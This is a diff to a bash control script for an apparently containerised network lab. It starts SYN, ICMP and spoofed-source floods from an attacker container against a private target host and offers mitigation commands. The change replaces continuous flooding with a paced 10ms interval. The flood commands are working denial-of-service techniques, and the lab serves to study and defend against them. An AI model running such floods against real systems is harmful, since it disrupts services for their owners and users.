@@ -3,8 +3,9 @@ set -euo pipefail
 
 cd -- "$(dirname -- "${BASH_SOURCE[0]}")"
 
-IFACE="eth0"          # attacker's only NIC (attack-net)
-TARGET="10.0.2.10"    # target host behind the router
+IFACE="eth0"           # attacker's only NIC (attack-net)
+TARGET="10.0.2.10"     # target host behind the router
+ATTACK_INTERVAL="10ms" # delay between packets (~100 packets/sec per attack)
 
 usage() {
     cat <<'HELP'
@@ -16,6 +17,8 @@ Attacks:
   icmp-flood         ICMP flood
   spoof-flood        Spoofed source IP flood to target port 80
   stop-attack        Stop all running attacks in the attacker container
+
+* Attack pacing is controlled by ATTACK_INTERVAL at the top of this script.
 
 Mitigation:
   mitigate-syn      Block TCP SYN traffic to target port 80
@@ -70,8 +73,8 @@ run_attack() {
         icmp)  args=(--icmp) ;;
         spoof) args=(--tcp -S --src-ip 10.0.1.0/24 --dst-port 80) ;;
     esac
-    docker compose exec -d -T attacker rping -I "$IFACE" --dst-ip "$TARGET" "${args[@]}" --flood --quiet
-    printf 'Started %s flood in the background.\n' "$type"
+    docker compose exec -d -T attacker rping -I "$IFACE" --dst-ip "$TARGET" "${args[@]}" --interval "$ATTACK_INTERVAL" --quiet
+    printf 'Started %s attack in the background (interval: %s).\n' "$type" "$ATTACK_INTERVAL"
 }
 
 stop_attack() {
